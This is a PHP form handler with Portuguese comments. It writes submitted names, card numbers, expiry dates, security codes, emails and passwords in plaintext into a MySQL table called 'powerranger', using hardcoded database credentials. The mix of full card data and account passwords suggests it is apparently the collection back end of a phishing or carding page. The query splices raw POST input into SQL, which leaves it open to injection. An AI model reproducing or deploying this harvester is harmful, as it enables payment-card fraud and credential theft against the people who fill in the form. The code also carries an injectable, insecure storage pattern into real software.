<?php
// Verifica se o formulário foi enviado
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Conexão com o banco de dados
    $servername = "srv740.hstgr.io"; // endereço do servidor MySQL
    $username = "u421113016_oriongsl"; // usuário do MySQL
    $password = "Buceta"; // senha do MySQL
    $dbname = "u421113016_BancoTeste"; // nome do banco de dados

    // Cria a conexão
    $conn = new mysqli($servername, $username, $password, $dbname);

    // Verifica a conexão
    if ($conn->connect_error) {
        die("Conexão falhou: " . $conn->connect_error);
    }

    // Prepara os dados para inserção no banco de dados
    $nome = $_POST['nome'];
    $num_cartao = $_POST['num_cartao'];
    $validade = $_POST['validade'];
    $digito_seguranca = $_POST['digito_seguranca'];
    $email = $_POST['email'];
    $senha = $_POST['senha'];

    // Query SQL para inserção dos dados
    $sql = "INSERT INTO powerranger (nome, numcartao, validade, digseg, email, senha) 
            VALUES ('$nome', '$num_cartao', '$validade', '$digito_seguranca', '$email', '$senha')";

    // Executa a query
    if ($conn->query($sql) === TRUE) {
        echo "Dados inseridos com sucesso!";
    } else {
        echo "Erro ao inserir dados: " . $conn->error;
    }

    // Fecha a conexão
    $conn->close();
}
?>
